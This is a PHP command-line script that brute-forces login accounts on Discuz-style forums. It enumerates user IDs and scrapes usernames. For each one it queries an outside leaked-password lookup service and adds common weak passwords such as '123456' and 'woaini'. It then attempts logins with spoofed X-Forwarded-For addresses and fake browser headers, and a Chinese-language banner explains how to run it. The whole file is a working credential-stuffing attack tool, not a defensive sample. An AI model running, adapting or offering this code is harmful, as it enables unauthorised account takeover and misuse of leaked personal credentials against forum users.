<?php 
class fuckdz{ 


  public function sgk($user){ 
    $a=file_get_contents("http://www.soyun.org/cha_api.php?so=$user&auto="); 
      $a=iconv("UTF-8", "GB2312//IGNORE", $a); 
    preg_match_all("/7%\">(.*)</isU",$a,$arr); 
    unset($arr[0]); 
    foreach ($arr as $key=>$r){ 
      return $r; 
      } 
  } 
   

  public function getuid($host,$uid){ 
       $a=file_get_contents("$host/home.php?mod=space&do=profile&from=space&&uid=$uid"); 
      if(!strpos($a,"charset=gbk")){ 
      $a=iconv("UTF-8", "GB2312//IGNORE", $a); 
      } 
       
      preg_match("/<title>(.*)的/isU",$a,$arr); 
      $a=str_replace("\r","",trim($arr[1])); 
      return $a=str_replace("\n","",$a); 
       
       
  } 
   
  public function is_pass($host,$user,$pass){ 
      $ip= rand(100, 244).'.'.rand(100, 244).'.'.rand(100, 244).'.'.rand(100, 244); 
      $opts = array (   
      'http' => array (   
      'method' => 'GET',   
      'header'=> "User-Agent: Mozilla/5.0 (iPhone; U; CPU like Mac OS X; en) AppleWebKit/420+ (KHTML, like Gecko) Version/3.0 Mobile\r\nReferer:http://www.baidu.com/index.php\r\nX-Forwarded-For: $ip\r\nCookie: xx=xx", 
      'timeout'=>15, ) 
      ); 
       
      $context = stream_context_create($opts); 
       $a=file_get_contents("$host/member.php?mod=logging&action=login&loginsubmit=yes&infloat=yes&lssubmit=yes&inajax=1&handlekey=ls&quickforward=yes&username=$user&password=$pass",false,$context); 
      if(strpos($a,"window.location.href")){ 
        return true; 
      }else{ 
        return false; 
      } 
   
  } 
  public function crack($host,$a,$b){ 
  $host=str_replace("http://","",$host); 
  $host="http://".$host."/"; 

  for($vip=$a;$vip<=$b;$vip++){ 
     
    $user=$this->getuid($host,$vip); 
    $pass=$this->sgk($user); 
    array_push($pass,"123456"); 
    array_push($pass,"654321"); 
    array_push($pass,"123123"); 
    array_push($pass,"woaini"); 
    array_push($pass,"caonima"); 
    array_push($pass,"12345"); 
    array_push($pass,"12345789"); 
    array_push($pass,"5201314"); 
    array_push($pass,"1314520"); 
    array_push($pass,$user); 
    array_push($pass,$user."123456"); 
    array_push($pass,"abc123"); 
    array_push($pass,$user.".."); 
     
      for($i=0;isset($pass[$i]);$i++){ 
        echo "\r\n正在爆破UID:$vip-[".$user."]---".$pass[$i].""; 
        if($this->is_pass($host,$user,$pass[$i])){ 
            echo "爆破成功!"; 
            break; 
            file_put_contents("ok.txt", $user."---".$pass[$i]."\r\n",FILE_APPEND); 
          }else{ 
            echo "爆破失败"; 
          } 
         

        } 
   


    } 

  } 
   
   
} 
$f=new fuckdz(); 
error_reporting(0); 
set_time_limit(0); 

if(empty($argv[1])){ 
print_r(" 
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++   


      开始爆破：php.exe $argv[0] 网址 起始uid 结束uid 
      示例: php.exe $argv[0] http://phpinfo.me/ 1 255 
      结果保存在ok.txt里 
      Blog:http://phpinfo.me 
   
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++   \n\n\n 
"); 
}else{ 


if(!empty($argv[1])){ 

    $f->crack($argv[1],$argv[2],$argv[3]); 
  }else{ 
    echo "逗比"; 
} 


} 





?>
